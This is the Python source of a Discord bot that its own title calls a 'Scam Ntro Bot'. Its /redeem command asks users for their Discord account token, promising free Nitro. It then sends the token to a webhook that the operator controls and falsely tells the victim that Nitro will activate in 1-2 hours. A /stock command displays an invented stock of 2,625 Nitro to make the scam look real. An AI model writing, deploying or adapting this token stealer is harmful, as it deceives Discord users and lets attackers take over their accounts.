import discord
from discord.ext import commands
import json
import requests
import os
from colorama import *
from pystyle import *


with open("config.json", "r") as f:
    config = json.load(f)

webhook_url = config["webhook_url"]
bot_token = config["bot_token"]

bot = commands.Bot(command_prefix="/")

os.system("mode 175,30 & title [Scam Ntro Bot - xeto#9999]")

kost = f"""
█░█ █▀▀ █▀▀ ▀▀█▀▀ █▀▀█   █▀▀▄ █▀▀█ ▀▀█▀▀
█▀▄ █▀▀ ▀▀█ ░░█░░ █▄▄█   █▀▀▄ █░░█ ░░█░░
▀░▀ ▀▀▀ ▀▀▀ ░░▀░░ ▀░░▀   ▀▀▀░ ▀▀▀▀ ░░▀░░
             >Press Enter
"""

@bot.event
async def on_ready():
    Anime.Fade(Center.Center(kost), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)
    print(f"Bot connected as {bot.user.name}")

    print(f"-----------------------Bot connected as {bot.user.name}----------------------")


@bot.slash_command(
    name="redeem",
    description="Allows you to redeem nitro on a token"
)
async def redeem(ctx: commands.Context, token: str, month: str):
    webhook_data = {
        "content": f"Token: {token}"
    }
    response = requests.post(webhook_url, json=webhook_data)
    if response.status_code == 204:
        embed = discord.Embed(title="Nitro Activation", description="Nitro should be active in 1-2 hours If the token its valid", color=discord.Color.green())
        
   
    embed = discord.Embed(
        title="Activated",
        description=f"**Your Nitro will be activeted in 1-2h if the tokens its valid**",
        color=0xED00FF
    )
    await ctx.send(embed=embed)
    

@bot.slash_command(
    name="stock",
    description="Allows you to see the current token stock!"
)
async def stock(ctx):
    embed = discord.Embed(
        title="Stock",
        description=f"**2625 Nitro in stock:** ",
        color=0xED00FF
    )

    await ctx.respond(embed=embed)
    
    


bot.run(bot_token)
